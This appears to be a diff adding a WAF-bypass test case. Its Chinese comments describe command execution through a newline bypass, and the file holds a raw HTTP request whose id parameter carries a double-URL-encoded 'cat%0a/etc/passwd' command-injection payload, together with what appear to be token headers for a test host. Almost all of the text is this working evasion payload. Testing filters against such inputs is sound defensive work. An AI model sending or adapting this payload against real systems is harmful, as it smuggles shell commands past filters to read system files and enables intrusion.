@@ -1,0 +1,9 @@
+# 命令执行(换行符绕过)
+# 使用url编码的%0a换行符代替空格使用进行绕过。
+GET /?id=cat%250a%2Fetc%2Fpasswd&bid=hd_tag_m8mv25jv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25jv
+RM-PRO-Token: 3bee552007686cd4f0e4b3e9701eae76
+RM-PRO-Time: 1742808474116
+User-Agent: curl/7.83.1
+
